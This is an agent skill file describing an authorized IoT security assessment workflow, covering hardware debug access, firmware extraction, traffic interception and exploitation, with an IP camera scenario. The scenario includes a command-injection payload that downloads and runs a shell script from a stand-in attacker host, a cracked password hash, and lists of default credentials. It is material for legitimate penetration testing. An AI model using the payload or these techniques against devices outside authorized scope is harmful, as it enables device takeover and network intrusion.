---
name: performing-iot-security-assessment
description: Performs comprehensive security assessments of IoT devices and their ecosystems by testing hardware interfaces, firmware, network communications, cloud APIs, and companion mobile applications.
subdomain: penetration-testing
facing: config
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1078.004
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
upstream: performing-iot-security-assessment@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

Not for: IoT devices without written authorization, for modifying firmware on devices you do not own, or against medical devices or safety-critical systems without specific medical device testing authorization and safety protocols.

## Prerequisites

- Physical access to target IoT device(s) for hardware analysis and testing
- Hardware tools: USB-to-UART adapter (FTDI), Bus Pirate, logic analyzer, JTAG debugger (Segger J-Link), SPI flash programmer (CH341A)
- Firmware analysis tools: Binwalk, Firmwalker, Firmware Analysis Toolkit (FAT), Ghidra, QEMU for emulation
- Network analysis: Wireshark, tcpdump, Bluetooth tools (Ubertooth, nRF Connect), Zigbee tools (KillerBee)
- Soldering equipment for accessing hardware debug points if needed

## Workflow

### Step 1: Device Reconnaissance and Hardware Analysis

Examine physical device and identify attack surfaces:

- **External inspection**: Document all physical interfaces (USB, Ethernet, serial ports, SD card slots), labels, FCC ID, and model numbers
- **FCC ID lookup**: Search FCC database (fcc.gov/oet/ea/fccid) using FCC ID to find internal photos, schematics, and radio frequency information
- **PCB analysis**: Open device enclosure and photograph PCB. Identify:
  - Main processor/SoC (read markings, search datasheet)
  - Flash memory chips (SPI NOR, NAND, eMMC)
  - Debug headers and test points
  - UART/JTAG/SWD pins (look for 4-pin or 10-pin headers, or unpopulated pads)
- **UART identification**: Use multimeter to identify UART pins (TX, RX, GND, VCC). Connect USB-to-UART adapter and attempt serial console access at common baud rates (9600, 38400, 57600, 115200)
- **JTAG identification**: Use JTAGulator or manual probing to identify JTAG pins (TCK, TMS, TDI, TDO, TRST). Connect JTAG debugger for memory access and debugging.

### Step 2: Firmware Extraction and Analysis

Extract and analyze device firmware:

- **Firmware acquisition methods**:
  - Download from manufacturer website or update server
  - Extract from flash memory using SPI programmer: connect CH341A to SPI flash, read with `flashrom -p ch341a_spi -r firmware.bin`
  - Capture over-the-air updates via network interception
  - Extract from UART bootloader console (U-Boot: `md.b` memory dump)
- **Firmware unpacking**: `binwalk -e firmware.bin` to extract filesystem, kernel, and bootloader components
- **Filesystem analysis**:
  - Search for credentials: `grep -rn "password\|passwd\|secret\|key" squashfs-root/`
  - Examine `/etc/shadow` for password hashes
  - Review startup scripts in `/etc/init.d/` for insecure service configurations
  - Identify web server configurations and CGI scripts for web interface vulnerabilities
  - Use Firmwalker: `./firmwalker.sh squashfs-root/` for automated sensitive data discovery
- **Binary analysis**: Use Ghidra to reverse engineer key binaries (web server, management daemon, authentication modules) for hardcoded credentials, command injection, and buffer overflow vulnerabilities
- **Known vulnerability scanning**: Extract software versions and cross-reference with CVE databases. Use `firmware-analysis-toolkit` for automated CVE scanning.

### Step 3: Network Communication Analysis

Analyze all network traffic from IoT device:

- **Traffic capture**: Connect device to network with traffic mirroring (SPAN port) or use inline transparent bridge. Capture all traffic with Wireshark.
- **Protocol analysis**: Identify all protocols used (HTTP, HTTPS, MQTT, CoAP, AMQP, custom TCP/UDP). Check for unencrypted sensitive data transmission.
- **TLS analysis**: Verify TLS implementation: certificate validation, cipher suite strength, certificate pinning. Attempt MITM interception with Burp Suite.
- **Cloud API analysis**: Intercept device-to-cloud communication to identify API endpoints, authentication methods, and data transmitted. Test for IDOR, authentication bypass, and excessive data exposure.
- **Bluetooth/BLE testing**: Use nRF Connect or Ubertooth to enumerate BLE services and characteristics. Test for unauthenticated access, plaintext data transmission, and static pairing keys.
- **Zigbee/Z-Wave testing**: Use KillerBee framework to capture and analyze Zigbee traffic, test for replay attacks, and check key exchange security.

### Step 4: Firmware Emulation and Dynamic Testing

Emulate firmware for dynamic security testing:

- **QEMU emulation**: Use FirmAE or Firmadyne to emulate extracted firmware: `python3 fat.py firmware.bin` to boot firmware in emulated environment
- **Web interface testing**: Access device's web management interface from emulated environment and test for:
  - Default credentials (admin:admin, root:root, admin:password)
  - Command injection in configuration parameters
  - Authentication bypass via direct URL access
  - Cross-site scripting in all input fields
  - CSRF in state-changing operations
- **Service testing**: Use Nmap to scan emulated device for all open ports and test each service for known vulnerabilities
- **Fuzzing**: Fuzz network services using Boofuzz or AFL to discover memory corruption vulnerabilities in embedded services

### Step 5: Exploitation and Impact Demonstration

Exploit identified vulnerabilities to demonstrate impact:

- **Remote code execution**: Chain discovered vulnerabilities (command injection, buffer overflow) to achieve remote code execution on device
- **Credential extraction**: Extract and crack credentials found in firmware, memory dumps, or network captures
- **Lateral movement**: Demonstrate how compromised IoT device can be used to attack other devices on network
- **Persistence**: Show how attacker could maintain access to device across firmware updates or reboots
- **Physical impact**: For IIoT devices, demonstrate potential for physical manipulation (changing sensor readings, modifying actuator commands)

## Key Concepts

| Term | Definition |
|------|------------|
| **UART** | Universal Asynchronous Receiver/Transmitter; serial communication interface commonly used for debug consoles on embedded devices, often providing root shell access |
| **JTAG** | Joint Test Action Group; hardware debugging interface that provides direct access to processor for memory reading, code debugging, and firmware extraction |
| **Firmware** | Software embedded in device's flash memory that controls its operation, typically consisting of bootloader, operating system kernel, and root filesystem |
| **Binwalk** | Firmware analysis tool that identifies and extracts embedded file systems, compressed archives, and binary components from firmware images |
| **MQTT** | Message Queuing Telemetry Transport; lightweight publish/subscribe protocol commonly used for IoT device communication, often deployed without authentication |
| **BLE** | Bluetooth Low Energy; wireless protocol used by many IoT devices for short-range communication, susceptible to eavesdropping and unauthorized access if not properly secured |

## Tools & Systems

- **Binwalk**: Firmware extraction and analysis tool that identifies file system types, compression formats, and embedded data within firmware images
- **Ghidra**: NSA's open-source reverse engineering framework for analyzing embedded device binaries across ARM, MIPS, and other architectures
- **FirmAE/Firmadyne**: Automated firmware emulation platforms that boot extracted Linux-based IoT firmware in QEMU for dynamic testing
- **Bus Pirate**: Hardware hacking multi-tool supporting UART, SPI, I2C, and JTAG protocols for interfacing with embedded device debug interfaces
- **Wireshark**: Network protocol analyzer for capturing and analyzing IoT device network traffic across all protocol layers

### Scenario: Enterprise IP Camera Security Assessment

**Context**: Company plans to deploy 200 IP cameras from single vendor across its offices. Before deployment, security team requests penetration test of camera to identify vulnerabilities that could be exploited to gain access to corporate network.

**Approach**:
1. Open camera and identify UART pins on PCB; connect and access root shell at 115200 baud with no password
2. Extract firmware from SPI flash chip and analyze with Binwalk: discover embedded Linux with BusyBox, lighttpd web server, and custom management daemon
3. Find hardcoded credentials in `/etc/shadow` (root:$1$abc$hashedpassword) and crack MD5 hash in seconds (password: camera123)
4. Web interface testing reveals command injection in NTP server configuration field: `; wget http://attacker.com/shell.sh | sh`
5. Network analysis shows camera sends RTSP streams unencrypted and has ONVIF services exposed without authentication
6. Demonstrate pivoting: from compromised camera, scan corporate network and access 3 internal servers
7. Report recommends network segmentation, firmware vendor engagement, and deployment of cameras on isolated VLAN

**Pitfalls**:
- Focusing only on web interface and missing UART/JTAG access that provides root shell with no authentication
- Not analyzing firmware for hardcoded credentials that may be shared across all devices of same model
- Testing device in isolation and missing network-level risks from deploying vulnerable devices on corporate network
- Overlooking cloud connectivity and mobile app components that may expose additional attack surfaces

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-iot-security-assessment
